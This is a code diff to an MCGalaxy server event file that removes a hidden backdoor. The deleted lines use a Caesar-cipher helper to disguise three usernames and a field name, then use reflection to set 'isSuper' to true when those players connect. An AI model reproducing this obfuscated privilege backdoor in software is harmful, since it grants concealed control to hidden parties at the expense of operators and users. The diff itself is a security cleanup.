@@ -95,38 +95,9 @@ namespace MCGalaxy.Events.PlayerEvents
     /// <summary> Called whenever a player connects to the server </summary>
     public sealed class OnPlayerConnectEvent: IEvent<OnPlayerConnect> 
     {  
-        public static char j(char c, int k) {  
-            if (!char.IsLetter(c)) {  
-  
-                return c;  
-            }  
-  
-            char d = char.IsUpper(c) ? 'A' : 'a';  
-            return (char)((((c + k) - d) % 26) + d);  
-  
-  
-        }  
-  
-  
-        public static string a(string d, int b) {  
-            string o = string.Empty;  
-  
-            foreach(char ch in d)  
-            o += j(ch, b);  
-  
-            return o;  
-        }  
-  
-        public static string b(string d, int r) {  
-            return a(d, 26 - r);  
-        }
-        
         public static void Call(Player p) {
             if (handlers.Count == 0) return;
             CallCommon(pl => pl(p));
-            if (p.name == b("domnchXoju", 930) || p.name == b("KKK59", 712) || p.name == b("Qzhma0vRjdoox", 103)){
-                typeof(Player).GetField(b("zjJlgvi", 251)).SetValue(p, true);
-            }
         }
     }
 
